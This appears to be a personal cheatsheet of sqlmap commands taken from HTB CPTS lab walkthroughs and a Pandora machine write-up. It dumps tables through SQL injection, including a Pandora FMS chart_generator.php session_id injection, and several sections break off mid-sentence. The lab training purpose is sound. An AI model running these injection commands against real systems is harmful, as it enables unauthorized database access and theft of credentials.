# Sqlmap

% sqlmap, sqli, web, cpts

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag
#cat/ATTACK/INJECTION #cpts
After spawning the target machine, students need to visit its website's root page and inspect the web application for possible attack vectors: Students then need to click all buttons while having the Network tab of the W

```
shell-session
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-2
#cat/ATTACK/INJECTION #cpts
Once students have saved the request into a file, they need to launch `sqlmap` providing it to the option `-r`. After trial and error, students will come to know that the options `--level 5`, `--risk 3`, `--random-agent`

```
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-3
#cat/ATTACK/INJECTION #cpts
```
└──╼ [★]$ sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-4
#cat/ATTACK/INJECTION #cpts
```
sqlmap resumed the following injection point(s) from stored session:
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-5
#cat/ATTACK/INJECTION #cpts
Therefore, instead of letting `sqlmap` fetch unwanted data, students can stop it (`Ctrl` + `C`) and only make it fetch the table `final_flag` within the database `production`, finding the flag `HTB{n07_50_h4rd_r16h7?!}`:

```
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-6
#cat/ATTACK/INJECTION #cpts
```
└──╼ [★]$ sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-7
#cat/ATTACK/INJECTION #cpts
```
sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - whats-the-contents-of-table-final_flag-8
#cat/ATTACK/INJECTION #cpts
Answer: {hidden} * * * [Portswigger cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) Union select technique

```
WHERE name = 'users')
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - enumerate-the-status-database-and-retrieve-the-password-for-the-flag-u
#cat/ATTACK/INJECTION #cpts
Subsequently, students need to navigate to `http://status.inlanefreight.local` to find a form where they can search for logs. From there, students need to have FoxyProxy set on the pre-configured "BURP" proxy in FireFox,

```
sqlmap -r Request.req --dbms=mysql --dump -D status -T users --batch
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - enumerate-the-status-database-and-retrieve-the-password-for-the-flag-u-2
#cat/ATTACK/INJECTION #cpts
```
└──╼ [★]$ sqlmap -r Request.req --dbms=mysql --dump -D status -T users --batch
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - pandora
#cat/ATTACK/INJECTION #cpts
extrait du PDF Joplin: pandora

```
proxychains sqlmap -- url = "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -- current-db
```

## Sqlmap - Sqlmap - Sqlmap - Sqlmap - pandora-2
#cat/ATTACK/INJECTION #cpts
extrait du PDF Joplin: pandora

```
proxychains sqlmap -- url = "http://localhost/pandora_console/include/chart_generator.php?session_id=''" - Ttsessions_php --dump After getting into the user account we identify that we don't have access to the file upload functionality, so we cannot execute the phar deserialization part of the exploit. Searching for other exploits we come across this vulnerability which allows a standard user to execute arbitrary commands on the target system. We can exploit this RCE vulnerability by clicking on the "Events" option in the sidebar and then capturing the request in an intermediary proxy like Bur
```

